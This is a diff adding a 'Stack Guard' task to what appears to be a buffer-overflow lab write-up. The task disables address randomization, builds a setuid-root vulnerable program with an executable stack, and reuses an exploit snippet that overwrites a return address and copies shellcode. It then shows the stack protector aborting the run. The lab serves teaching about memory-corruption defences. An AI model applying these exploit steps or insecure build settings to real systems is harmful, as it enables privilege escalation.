@@ -121,3 +121,31 @@ strcpy(buffer + 480, shellcode);
     sh -c "while [ l ]; do ./stack; done;"
 
 Wait for a while until you get a root shell again!
+
+# Task 3: Stack Guard
+
+Turn off the address randomization again, and recompile `stack.c` with stack guard:
+
+    sudo sysctl -w kernel.randomize_va_space=0
+    sudo gcc -o stack -z execstack stack.c
+    sudo chmod 4755 stack
+
+Edit `exploit.c` to older version done in Task 1 (just recover `BUF`):
+
+```c
+long addr = BUF + OFFSET + 4;
+long *ptr = (long *) (buffer + OFFSET);
+*ptr = addr;
+strcpy(buffer + 480, shellcode);
+```
+
+See what will happen:
+
+    gcc -o exploit exploit.c
+    ./exploit
+    ./stack
+
+You should see an error message here:
+
+    *** stack smashing detected ***: ./stack terminated
+    Aborted (core dumped)
